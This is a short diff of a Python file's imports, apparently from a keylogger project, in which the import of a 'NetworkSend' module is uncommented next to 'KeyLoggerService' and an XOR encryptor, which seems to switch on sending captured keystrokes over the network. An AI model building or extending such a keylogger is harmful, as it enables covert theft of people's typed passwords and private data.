@@ -1,6 +1,6 @@
 import os
 from KeyLoggerService import KeyLoggerService
-# from Network_send import NetworkSend
+from Network_send import NetworkSend
 from FileWriter import FileWriterWithTime
 from dotenv import load_dotenv
 from Encryptor import XorEncryptor
